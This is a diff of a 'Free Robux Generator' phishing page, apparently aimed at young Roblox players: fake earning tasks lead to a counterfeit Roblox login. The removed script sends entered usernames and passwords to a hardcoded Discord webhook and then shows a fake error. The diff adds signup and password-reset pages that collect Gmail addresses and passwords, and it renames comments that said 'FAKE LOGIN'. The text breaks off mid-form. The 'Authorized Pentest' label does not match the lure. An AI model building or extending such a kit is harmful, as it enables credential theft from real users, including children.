@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎮 Free Robux Generator</title>
+<title>Free Robux Generator</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
 body { background: #f0f0f0; }
 .page { display: none; width: 100%; min-height: 100vh; }
 .page.active { display: block; }
 
-/* ========== PAGE 1 - EARN SITE ========== */
+/* ========== PAGE 1 ========== */
 .p1 { background: linear-gradient(135deg, #0a0a1a, #1a1a3e, #0f3460); min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: flex-start; }
 .p1-box { background: #1a1a2e; border-radius: 24px; padding: 30px 25px; max-width: 480px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid rgba(255,215,0,0.15); }
 .p1-title { text-align: center; margin-bottom: 20px; }
@@ -24,9 +24,15 @@ body { background: #f0f0f0; }
 .p1-card .c-title { color: #fff; font-size: 15px; font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
 .p1-card .c-title .tag { background: #ffd700; color: #000; font-size: 10px; padding: 2px 10px; border-radius: 20px; font-weight: 700; }
 .p1-card .c-sub { color: #777; font-size: 12px; margin-bottom: 12px; }
-.inp-row { display: flex; gap: 10px; }
-.inp-row input { flex: 1; padding: 12px 14px; border-radius: 12px; border: 1px solid #333; background: #0a0a1a; color: #fff; font-size: 14px; outline: none; transition: 0.2s; }
-.inp-row input:focus { border-color: #ffd700; }
+.cap-box { background: #0a0a1a; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 12px; border: 1px solid #2a2a40; }
+.cap-box .code { color: #ffd700; font-size: 32px; font-weight: 900; letter-spacing: 4px; font-family: monospace; }
+.cap-box .hint { color: #555; font-size: 11px; margin-top: 4px; }
+.cap-row { display: flex; gap: 10px; }
+.cap-row input { flex: 1; padding: 12px 14px; border-radius: 12px; border: 1px solid #333; background: #0a0a1a; color: #fff; font-size: 16px; font-family: monospace; text-align: center; letter-spacing: 2px; outline: none; transition: 0.2s; text-transform: uppercase; }
+.cap-row input:focus { border-color: #ffd700; }
+.cap-row input.correct { border-color: #00c853; background: #0a1a0a; }
+.cap-row input.wrong { border-color: #d32f2f; background: #1a0a0a; animation: shake 0.3s; }
+@keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 .btn { padding: 12px 22px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 13px; transition: 0.2s; }
 .btn-gld { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; }
 .btn-gld:hover { transform: scale(1.03); box-shadow: 0 5px 20px rgba(255,215,0,0.3); }
@@ -34,16 +40,23 @@ body { background: #f0f0f0; }
 .btn-grn:hover { transform: scale(1.03); }
 .btn-red { background: linear-gradient(135deg, #d32f2f, #b71c1c); color: #fff; }
 .btn-red:hover { transform: scale(1.03); }
-.upload-area { border: 2px dashed #333; border-radius: 14px; padding: 25px; text-align: center; color: #555; cursor: pointer; transition: 0.2s; margin-bottom: 8px; }
-.upload-area:hover { border-color: #ffd700; color: #ffd700; background: rgba(255,215,0,0.03); }
-.upload-area input { display: none; }
-.upload-area .icon { font-size: 36px; margin-bottom: 8px; }
-.vid-info { display: flex; justify-content: space-between; color: #666; font-size: 12px; margin-top: 6px; }
+.btn-bl { background: linear-gradient(135deg, #2196f3, #0d47a1); color: #fff; }
+.btn-bl:hover { transform: scale(1.03); }
+.btn-sm { padding: 8px 14px; font-size: 12px; }
+.cap-ai { background: #0a1a0a; border: 1px solid #1a3a1a; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 12px; color: #4caf50; display: none; align-items: center; gap: 8px; }
+.cap-ai.show { display: flex; }
+.vid-input-row { display: flex; gap: 10px; }
+.vid-input-row input { flex: 1; padding: 12px 14px; border-radius: 12px; border: 1px solid #333; background: #0a0a1a; color: #fff; font-size: 14px; outline: none; transition: 0.2s; }
+.vid-input-row input:focus { border-color: #2196f3; }
+.vid-ai { background: #0a1a2a; border: 1px solid #1a3a5a; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 12px; color: #2196f3; display: none; align-items: center; gap: 8px; }
+.vid-ai.show { display: flex; }
+.vid-ai.fail { background: #1a0a0a; border-color: #3a1a1a; color: #f44336; }
+.vid-info { display: flex; justify-content: space-between; color: #666; font-size: 12px; margin-top: 8px; }
 .withdraw-wrap { text-align: center; padding: 5px 0; }
 .withdraw-wrap .req { color: #666; font-size: 12px; margin-top: 8px; }
 .footer-note { text-align: center; color: #333; font-size: 10px; margin-top: 16px; opacity: 0.5; }
 
-/* ========== PAGE 2 - PRIVATE SERVER ========== */
+/* ========== PAGE 2 ========== */
 .p2 { background: linear-gradient(135deg, #0a0a1a, #1a0a2e); min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
 .p2-box { background: #15152a; border-radius: 24px; padding: 35px 25px; max-width: 460px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid #2a2a40; text-align: center; }
 .p2-stat { display: flex; align-items: center; justify-content: center; gap: 8px; color: #aaa; font-size: 13px; margin-bottom: 20px; }
@@ -66,7 +79,7 @@ body { background: #f0f0f0; }
 .p2-online { color: #444; font-size: 11px; margin-top: 14px; }
 .p2-ad { margin-top: 16px; padding: 10px; background: #0e0e22; border-radius: 10px; color: #555; font-size: 12px; border: 1px solid #222240; }
 
-/* ========== PAGE 3 - FAKE LOGIN ========== */
+/* ========== PAGE 3 - LOGIN ========== */
 .p3 { background: #e8e8e8; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
 .p3-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
 .p3-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff6b6b); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(255,107,107,0.2); }
@@ -82,24 +95,61 @@ body { background: #f0f0f0; }
 .btn-log:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 .p3-err { color: #d32f2f; font-size: 13px; margin-top: 12px; display: none; }
 .p3-links { margin-top: 16px; font-size: 12px; }
-.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; }
+.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; cursor: pointer; }
 .p3-links a:hover { text-decoration: underline; }
 .p3-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
 .spin { display: none; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
 @keyframes spin { to { transform: rotate(360deg); } }
-.btn-log .btxt { display: inline; }
 .btn-log.load .btxt { display: none; }
 .btn-log.load .spin { display: block; }
 .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #222; color: #fff; padding: 14px 28px; border-radius: 12px; display: none; z-index: 999; font-size: 14px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
 .toast.show { display: block; animation: fadeio 2.2s ease; }
 @keyframes fadeio { 0% { opacity: 0; transform: translateX(-50%) translateY(-15px); } 12% { opacity: 1; transform: translateX(-50%) translateY(0); } 80% { opacity: 1; transform: translateX(-50%) translateY(0); } 100% { opacity: 0; transform: translateX(-50%) translateY(-15px); } }
+
+/* ========== PAGE 4 - SIGN UP ========== */
+.p4 { background: #e8f5e9; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p4-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
+.p4-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #4caf50, #2196f3); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(33,150,243,0.2); }
+.p4-box h1 { color: #222; font-size: 22px; }
+.p4-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
+.p4-grp { margin-bottom: 16px; text-align: left; }
+.p4-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
+.p4-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
+.p4-grp input:focus { border-color: #4caf50; background: #fff; }
+.btn-sign { background: linear-gradient(135deg, #4caf50, #2e7d32); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(76,175,80,0.2); margin-top: 6px; }
+.btn-sign:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(76,175,80,0.3); }
+.btn-sign:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.p4-links { margin-top: 16px; font-size: 12px; }
+.p4-links a { color: #4caf50; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p4-links a:hover { text-decoration: underline; }
+.p4-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
+
+/* ========== PAGE 5 - FORGOT PASSWORD ========== */
+.p5 { background: #fff3e0; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p5-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
+.p5-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ff9800, #f44336); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(244,67,54,0.2); }
+.p5-box h1 { color: #222; font-size: 22px; }
+.p5-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
+.p5-grp { margin-bottom: 16px; text-align: left; }
+.p5-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
+.p5-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
+.p5-grp input:focus { border-color: #ff9800; background: #fff; }
+.btn-reset { background: linear-gradient(135deg, #ff9800, #e65100); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(255,152,0,0.2); margin-top: 6px; }
+.btn-reset:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,152,0,0.3); }
+.btn-reset:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.p5-links { margin-top: 16px; font-size: 12px; }
+.p5-links a { color: #ff9800; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p5-links a:hover { text-decoration: underline; }
+.p5-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
+.p5-code-status { display: none; padding: 12px; margin-top: 10px; border-radius: 10px; font-size: 13px; }
+.p5-code-status.show { display: block; }
 </style>
 </head>
 <body>
 
 <div id="toast" class="toast"></div>
 
-<!-- ========== PAGE 1: EARN ROBUX ========== -->
+<!-- ========== PAGE 1 - EARN ========== -->
 <div class="page active" id="page1">
 <div class="p1">
 <div class="p1-box">
@@ -115,34 +165,55 @@ body { background: #f0f0f0; }
   <div class="note">Minimum withdraw: 100 Robux</div>
 </div>
 
+<!-- CAPTION SECTION -->
 <div class="p1-card">
   <div class="c-title">📝 Caption Tasks <span class="tag">+5 each</span></div>
-  <div class="c-sub">Write a caption, earn 5 Robux instantly!</div>
-  <div class="inp-row">
-    <input type="text" id="captionInput" placeholder="Write a caption..." maxlength="150">
-    <button class="btn btn-gld" id="submitCaptionBtn">Submit</button>
+  <div class="c-sub">Type the letter+number code shown below to earn Robux!</div>
+  
+  <div class="cap-box">
+    <div class="code" id="captionCode">A1</div>
+    <div class="hint">Type this code exactly as shown</div>
   </div>
+  
+  <div class="cap-row">
+    <input type="text" id="captionInput" placeholder="Type code..." maxlength="3" autocomplete="off">
+    <button class="btn btn-gld" id="submitCaptionBtn">Submit</button>
+    <button class="btn btn-bl btn-sm" id="refreshCaptionBtn">🔄</button>
+  </div>
+  
+  <div class="cap-ai" id="captionAIStatus">
+    <span>🔍</span>
+    <span id="captionAIMsg">AI verification: Caption code correct!</span>
+  </div>
+  
   <div style="display:flex;justify-content:space-between;margin-top:8px;color:#555;font-size:12px;">
-    <span>Total captions: <span id="captionCount">0</span></span>
-    <span style="color:#00c853;font-weight:600;">+5 🪙</span>
+    <span>Completed: <span id="captionCount">0</span></span>
+    <span style="color:#00c853;font-weight:600;">+5 🪙 each</span>
   </div>
 </div>
 
+<!-- VIDEO SECTION -->
 <div class="p1-card">
-  <div class="c-title">🎥 Video Upload <span class="tag">+50 each</span></div>
-  <div class="c-sub">Upload a Roblox video — earn 50 Robux! (3 videos max per week)</div>
-  <div class="upload-area" id="uploadArea">
-    <div class="icon">📤</div>
-    <div>Click to upload your video</div>
-    <div style="font-size:11px;margin-top:5px;color:#444;">MP4, MOV, WEBM supported</div>
-    <input type="file" id="videoInput" accept="video/*">
+  <div class="c-title">🎥 YouTube Video <span class="tag">+50 each</span></div>
+  <div class="c-sub">Upload a Roblox video to YouTube and paste the link! (3 videos max per week)</div>
+  
+  <div class="vid-input-row">
+    <input type="text" id="videoLinkInput" placeholder="Paste YouTube link here...">
+    <button class="btn btn-grn" id="submitVideoBtn">Verify</button>
   </div>
+  
+  <div class="vid-ai" id="videoAIStatus">
+    <span>🤖</span>
+    <span id="videoAIMsg">AI verification: Valid YouTube video detected!</span>
+  </div>
+  
   <div class="vid-info">
     <span>Videos uploaded: <span id="videoCount">0</span> / 3</span>
     <span style="color:#555;">(resets weekly)</span>
   </div>
 </div>
 
+<!-- WITHDRAW -->
 <div class="p1-card">
   <div class="c-title">💸 Withdraw</div>
   <div class="withdraw-wrap">
@@ -151,8 +222,9 @@ body { background: #f0f0f0; }
   </div>
 </div>
 
-<div style="text-align:center;margin-top:6px;">
+<div style="display:flex;justify-content:center;gap:10px;margin-top:6px;">
   <button class="btn btn-red" id="clearDataBtn" style="padding:10px 24px;">Clear All Data</button>
+  <button class="btn btn-bl" id="gotoLoginBtn" style="padding:10px 24px;">Account</button>
 </div>
 <p class="footer-note">Unofficial fan site. Not affiliated with Roblox Corporation.</p>
 
@@ -160,7 +232,7 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<!-- ========== PAGE 2: PRIVATE SERVER DONATION ========== -->
+<!-- ========== PAGE 2 - PRIVATE SERVER ========== -->
 <div class="page" id="page2">
 <div class="p2">
 <div class="p2-box">
@@ -192,7 +264,7 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<!-- ========== PAGE 3: FAKE ROBLOX LOGIN ========== -->
+<!-- ========== PAGE 3 - LOGIN ========== -->
 <div class="page" id="page3">
 <div class="p3">
 <div class="p3-box">
@@ -204,12 +276,12 @@ body { background: #f0f0f0; }
 
 <form id="loginForm" autocomplete="off">
   <div class="p3-grp">
-    <label>Username</label>
-    <input type="text" id="username" placeholder="Enter your Roblox username" required autocomplete="off">
+    <label>Username or Email</label>
+    <input type="text" id="loginUsername" placeholder="Enter your Roblox username or email" required autocomplete="off">
   </div>
   <div class="p3-grp">
     <label>Password</label>
-    <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+    <input type="password" id="loginPassword" placeholder="Enter your password" required autocomplete="off">
   </div>
   <button type="submit" class="btn-log" id="loginBtn">
     <span class="btxt">Sign In</span>
@@ -217,11 +289,11 @@ body { background: #f0f0f0; }
   </button>
 </form>
 
-<div class="p3-err" id="errorMsg">⚠️ Invalid username or password. Please try again.</div>
+<div class="p3-err" id="loginErrorMsg">⚠️ Invalid username or password. Please try again.</div>
 
 <div class="p3-links">
-  <a href="#">Forgot password?</a>
-  <a href="#">Create account</a>
+  <a id="gotoForgotLink">Forgot password?</a>
+  <a id="gotoSignupLink">Create account</a>
 </div>
 <div class="p3-foot">Donation verification required · Official Roblox login</div>
 
@@ -229,188 +301,24 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<script>
-// ==================== CONFIG ====================
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-';
+<!-- ========== PAGE 4 - SIGN UP ========== -->
+<div class="page" id="page4">
+<div class="p4">
+<div class="p4-box">
 
-// ==================== TOAST ====================
-function showToast(msg) {
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.classList.remove('show');
-  void t.offsetWidth;
-  t.classList.add('show');
-  setTimeout(() => t.classList.remove('show'), 2400);
-}
+<div class="p4-logo">🚀</div>
+<h1>Create Your Account</h1>
+<p class="p4-sub">Sign up for free and start earning Robux today!</p>
 
-function switchPage(id) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(id).classList.add('active');
-}
-
-// ==================== DATA LAYER ====================
-const SK = 'rbx_sim_data';
-const WK = 'rbx_sim_week';
-
-function getData() {
-  const r = localStorage.getItem(SK);
-  if (r) { try { return JSON.parse(r); } catch(e) {} }
-  return { bal: 0, caps: 0, vids: [] };
-}
-function saveData(d) { localStorage.setItem(SK, JSON.stringify(d)); }
-
-function getWeek() {
-  const n = new Date();
-  const s = new Date(n.getFullYear(), 0, 1);
-  return `${n.getFullYear()}-W${Math.ceil((n - s) / (7*24*60*60*1000))}`;
-}
-
-function checkWeek() {
-  const s = localStorage.getItem(WK);
-  const c = getWeek();
-  if (s !== c) {
-    const d = getData();
-    d.vids = [];
-    saveData(d);
-    localStorage.setItem(WK, c);
-  }
-}
-
-function updUI() {
-  checkWeek();
-  const d = getData();
-  document.getElementById('balanceDisplay').textContent = d.bal;
-  document.getElementById('captionCount').textContent = d.caps;
-  document.getElementById('videoCount').textContent = d.vids.length;
-}
-
-// ==================== CAPTIONS ====================
-document.getElementById('submitCaptionBtn').addEventListener('click', function() {
-  const inp = document.getElementById('captionInput');
-  const txt = inp.value.trim();
-  if (!txt) { showToast('⚠️ Please write a caption first!'); return; }
-  const d = getData();
-  d.bal += 5;
-  d.caps += 1;
-  saveData(d);
-  updUI();
-  inp.value = '';
-  showToast('✅ +5 Robux earned for your caption!');
-});
-
-// ==================== VIDEOS ====================
-document.getElementById('uploadArea').addEventListener('click', function() {
-  document.getElementById('videoInput').click();
-});
-document.getElementById('videoInput').addEventListener('change', function(e) {
-  checkWeek();
-  const d = getData();
-  if (d.vids.length >= 3) { showToast('⚠️ Weekly limit reached! (3/3 videos)'); this.value = ''; return; }
-  const f = e.target.files[0];
-  if (!f) return;
-  d.bal += 50;
-  d.vids.push({ name: f.name, size: f.size, time: new Date().toISOString() });
-  saveData(d);
-  updUI();
-  this.value = '';
-  showToast('✅ +50 Robux for uploading a video!');
-});
-
-// ==================== WITHDRAW → PAGE 2 ====================
-document.getElementById('withdrawBtn').addEventListener('click', function() {
-  const d = getData();
-  if (d.bal < 100) { showToast(`⚠️ Need ${100 - d.bal} more Robux to withdraw!`); return; }
-  d.bal -= 100;
-  saveData(d);
-  updUI();
-  showToast('🔄 Processing withdrawal...');
-  setTimeout(() => switchPage('page2'), 1500);
-});
-
-// ==================== CLEAR ====================
-document.getElementById('clearDataBtn').addEventListener('click', function() {
-  if (confirm('Reset all data?')) {
-    localStorage.removeItem(SK);
-    localStorage.removeItem(WK);
-    updUI();
-    showToast('🔄 Data reset complete');
-  }
-});
-
-// ==================== DONATE → PAGE 3 ====================
-document.getElementById('donateBtn').addEventListener('click', function() {
-  switchPage('page3');
-});
-
-// ==================== FAKE LOGIN + DISCORD ====================
-document.getElementById('loginForm').addEventListener('submit', async function(e) {
-  e.preventDefault();
-
-  const user = document.getElementById('username').value.trim();
-  const pass = document.getElementById('password').value.trim();
-  const btn = document.getElementById('loginBtn');
-  const err = document.getElementById('errorMsg');
-
-  if (!user || !pass) {
-    err.textContent = '⚠️ Please fill in all fields.';
-    err.style.display = 'block';
-    return;
-  }
-
-  btn.classList.add('load');
-  btn.disabled = true;
-  err.style.display = 'none';
-
-  const data = {
-    username: user,
-    password: pass,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    url: window.location.href
-  };
-
-  // Send to Discord webhook
-  try {
-    await fetch(DISCORD_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: '**🚨 New Credentials Captured (Authorized Pentest)**',
-        embeds: [{
-          title: 'Roblox Phishing Simulation',
-          color: 15158332,
-          fields: [
-            { name: '👤 Username', value: '`' + data.username + '`', inline: true },
-            { name: '🔑 Password', value: '`' + data.password + '`', inline: true },
-            { name: '🕐 Time', value: data.timestamp, inline: false },
-            { name: '🌐 UA', value: data.userAgent.substring(0, 100), inline: false }
-          ],
-          footer: { text: 'Authorized Penetration Test' }
-        }]
-      })
-    });
-  } catch (err) {
-    console.log('Discord send failed (sim):', err);
-  }
-
-  // Console log
-  console.log('=== CAPTURED ===');
-  console.log('User:', data.username);
-  console.log('Pass:', data.password);
-  console.log('Time:', data.timestamp);
-  console.log('================');
-
-  // Fake error
-  setTimeout(() => {
-    btn.classList.remove('load');
-    btn.disabled = false;
-    err.textContent = '⚠️ Invalid username or password. Please try again.';
-    err.style.display = 'block';
-  }, 2000);
-});
-
-// ==================== INIT ====================
-updUI();
-</script>
-</body>
-  </html>
+<form id="signupForm" autocomplete="off">
+  <div class="p4-grp">
+    <label>Username</label>
+    <input type="text" id="signupUser" placeholder="Choose a username" required autocomplete="off">
+  </div>
+  <div class="p4-grp">
+    <label>Email Address (Gmail)</label>
+    <input type="email" id="signupEmail" placeholder="your.email@gmail.com" required autocomplete="off">
+  </div>
+  <div class="p4-grp">
+    <label>Create Password</label>
+    <input type="password" id="signupPass" placeholder="Minimum 6 cha
